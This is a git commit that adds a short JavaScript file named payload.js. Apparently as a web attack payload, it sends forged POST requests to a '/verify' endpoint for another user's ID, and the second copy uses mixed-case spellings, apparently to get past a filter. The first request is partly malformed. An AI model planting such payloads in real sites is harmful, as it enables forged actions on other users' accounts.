81d1ed0d334505e54094b7d981c9f06f65ac5c66
Noob Sek <noob@localhost.localdomain>
2024-12-20 01:43:08 +0530

    adding the payload

---
+++ payload.js
@@ -0,0 +1,12 @@
+fetch("/verify",{
+    method: "POST",
+    headers:"{Content-Type: application/x-www-form-urlencoded}",
+    body: "user_id=2&verification_id:1"
+});
+
+
+fetch("/verIfy",{
+    method: "POST",
+    headers:{"Content-Type": "application/x-www-fOrm-urlencoded"},
+    body: "user_id=2&verIfication_id:1"
+});
